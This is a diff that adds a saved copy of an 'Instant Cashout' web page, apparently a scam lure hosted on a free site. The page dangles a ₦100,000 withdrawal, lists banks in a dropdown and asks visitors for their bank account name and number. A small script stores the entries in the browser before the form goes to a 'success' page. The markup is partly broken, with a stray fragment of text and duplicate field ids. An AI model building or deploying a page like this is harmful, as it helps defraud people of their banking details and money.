@@ -1,0 +1,105 @@
+
+<!-- saved from url=(0049)https://insant-cashou.000webhostapp.com/next.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://insant-cashou.000webhostapp.com/unnamed.png">
+    <script src="./withdraw_files/jquery.min.js.download"></script>
+    <title>Instant Cashout | Funding Section</title>
+    <script>
+        function passvalue(){
+            var Phone=document.getElementById("Phone").value;
+            localStorage.setItem("textvalue", Phone);
+
+            var amount=document.getElementById("amount").value;
+            localStorage.setItem("textmiddle", amount);
+
+        }
+    </script>
+    <style>
+        body {
+            background-color: whitesmoke;
+        }
+input {
+  width: 250px;
+  height: 40px;
+  border-radius: 5px;
+  border: 1px solid black;
+  outline: none;
+  box-shadow: 00 1px black;
+  color: black;
+  font-size: 13px;
+}
+.input {
+  width: 250px;
+  height: 40px;
+  border-radius: 5px;
+  border: 1px solid black;
+  font-family: 'Times New Roman', Times, serif;
+  outline: none;
+  box-shadow: 00 1px black;
+  color: black;
+  font-size: 13px;
+}
+        }
+    </style>
+</head>
+<body>
+    <br>
+      <h3 style="text-align: center; color:  #FFBA00; font-family: Arial, Helvetica, sans-serif; font-weight: bold;">INSTANT CASHOUT</h3>
+      <br>
+      <center>
+      <form class="form" method="get" action="successfull.html">
+        <select class="input">
+          <option>....Select Bank....</option>
+                <option>Absa SA</option>
+                <option>Access Bank</option>
+                n Bank Limited
+<option>Aso Saving And Bank</option>
+<option>Access Bank Plc</option>
+<option>AssetMatrix MFB</option>
+<option>Capitec Bank</option>
+<option>Citibank</option>
+<option>Chase Bank</option>
+<option>Diamond Bank</option>
+<option>Ecobank Plc</option>
+<option>Enterprise Bank</option>
+<option>Eyowo MFB</option>
+<option>Fidelity Bank</option>
+<option>First Bank Of Nigeria</option>
+<option>First City Monument Bank</option>
+<option>GTBank</option>
+<option>Heritage Bank</option>
+<option>Keystone Bank</option>
+<option>Kuda MFB</option>
+<option>MOMO</option>
+<option>MONIEPOINT</option>
+<option>Opay (PAYCOM)</option>
+<option>PalmPay</option>
+<option>Polaris Bank</option>
+<option>Providus Bank</option>
+<option>Rubies MFB</option>
+<option>Stanbic IBTC Bank</option>
+<option>Sterling Bank</option>
+<option>United Bank For Africa</option>
+<option>Wema Bank</option>
+<option>Zenith Bank PLC</option>
+
+        </select>
+        <br>
+        <br>
+        <input type="tel" placeholder="₦100,000.00" id="amount" name="amount" disabled="">
+        <br>
+        <br>
+        <input type="text" placeholder="Your Account Name" class="form--input" id="Phone" name="Phone" required="">
+        <br>
+        <br>
+        <input type="tel" placeholder="Your Account Number" class="form--input" id="Phone" name="Phone" maxlength="11" required="">
+        <br>
+        <br>
+        <button onclick="passvalue();" class="input" style="background-color: #FFBA00; color: white; font-weight: bold; font-family: Arial, Helvetica, sans-serif; width: 40%;">WITHDRAW NOW</button>
+    </form>
+</center>
+
+</body></html>
